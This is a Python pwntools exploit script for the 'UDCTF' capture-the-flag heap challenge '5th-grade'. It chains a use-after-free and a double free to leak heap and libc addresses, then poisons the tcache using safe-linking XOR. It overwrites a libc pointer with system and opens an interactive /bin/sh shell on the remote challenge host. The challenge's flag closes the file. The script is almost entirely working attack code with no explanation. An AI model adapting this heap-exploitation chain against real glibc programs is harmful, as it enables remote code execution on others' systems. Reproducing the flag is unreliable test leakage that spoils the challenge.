from pwn import *

libc = ELF("./libc.so.6")

context.terminal = ["kitty"]
if args.GDB:
    p = gdb.debug("./5th-grade", gdbscript="c")
elif args.REMOTE:
    p = remote("0.cloud.chals.io", 34322)
else:
    p = process("./5th-grade")

def make(index, size):
    p.sendlineafter(b":", b"1")
    p.sendlineafter(b"?", str(index).encode())
    p.sendlineafter(b"?", str(size).encode())

def edit(index, data):
    p.sendlineafter(b":", b"2")
    p.sendlineafter(b"?", str(index).encode())
    p.sendlineafter(b"?", data)

def free(index):
    p.sendlineafter(b":", b"3")
    p.sendlineafter(b"?", str(index).encode())

def view(index):
    p.sendlineafter(b":", b"4")
    p.sendlineafter(b"?", str(index).encode())
    p.recvline()
    return p.recvline()[:-1]

make(61, 32)
free(61)
make(61, 32)
heap = u64(view(61).ljust(8, b"\x00"))
log.info(f"heap: {heap:x}")

for i in range(62, 69):
    make(i, 32)

make(0, 0x800)
make(1, 0)
free(0)
make(2, 0x2000)

make(0, 32)

leak = u64(view(0).ljust(8, b"\x00"))
base = leak - 0x21a1d0
target = base + 0x00319098 - 0x100000 - 0x18
log.info(f"leak: 0x{leak:x}")
log.info(f"base: 0x{base:x}")
log.info(f"target: 0x{target:x}")

make(1, 32)
make(2, 32)
make(3, 32)

for i in range(62, 69):
    free(i)

free(2)
free(0)
free(1)
free(0)

for i in range(62, 69):
    make(i, 32)

make(16, 32)
edit(16, p64(target ^ heap))
make(17, 32)
make(18, 32)
make(19, 32)

edit(68, b"/bin/sh\x00")
edit(19, p64(0) * 3 + p64(base + libc.sym.system))
view(68)

p.interactive()

# UDCTF{simple_things_r_hard_wen_you_eat_crayons}